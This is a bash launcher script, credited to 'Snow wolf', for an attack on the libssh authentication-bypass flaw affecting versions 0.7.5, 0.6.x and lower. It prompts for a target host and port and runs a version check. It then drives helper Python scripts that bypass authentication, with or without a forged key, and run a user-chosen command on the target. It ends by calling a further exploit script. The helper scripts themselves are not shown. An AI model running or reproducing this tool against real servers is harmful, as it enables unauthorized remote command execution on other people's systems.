#!/bin/bash
RED="\033[31m"
GREEN="\033[32m"
BLUE="\033[34m"
RESET="\033[0m"
BASH=/bin/bash
PYTHON=/usr/bin/python
echo  -e "$BLUE 		   			                        
L       II B       SSSSSS  SSSSSS H     H
L          B      SS      SS      H     H
L       II B      SS      SS      H     H
L       II BBBBBB  SSSSSS  SSSSSS HHHHHHH 
L       II B    BB      S       S H     H
L       II B   BB       S       S H     H
LLLLLL  II BBBBB   SSSSS   SSSSS  H     H
BY:Snow wolf
$RESET"
echo -e "[$RED 1.check libssh version $RESET]"
echo -e "[$RED libssh vulnerablility impact version $RESET]"
echo -e "[$RED 0.7.5 0.6.* or lower $RESET]"
read -p 'please input your libssh host ip :' CHECK_IP
read -p 'please input your libssh port : ' CHECK_PORT
$PYTHON checkversionofserver.py --host $CHECK_IP --port $CHECK_PORT
echo -e "[$GREEN 2.libssh authentication bypass $RESET]"
read -p 'do you have a forged key(yes/no) : ' IF_KEY
  if [ "$IF_KEY" = "yes" ]
    then
	    read -p 'please input your libssh host ip : ' FORGED_IP
	    read -p 'please input your libssh port : ' FORGED_PORT
	    read -p 'please input your libssh username : ' FORGED_USER
	    read -p 'please input your libssh key : ' FORGED_KEY
	    read -p 'please input your want to executive order : ' FORGED_COMMAND
	    $PYTHON bypasswithfakekey.py --host $FORGED_IP -p $FORGED_PORT -u $FORGED_USER -k $FORGED_KEY -c $FORGED_COMMAND
    elif [ "$IF_KEY" = "no" ]
    then
	    read -p 'please input your libssh host ip : ' LIBSSH_IP
	    read -p 'please input your libssh port : ' LIBSSH_PORT
	    read -p 'please input your want to executive order : ' LIBSSH_COMMAND
	    $PYTHON libsshauthbypass.py --host $LIBSSH_IP -p $LIBSSH_PORT -c $LIBSSH_COMMAND
    fi
$BASH cve-exploit.sh
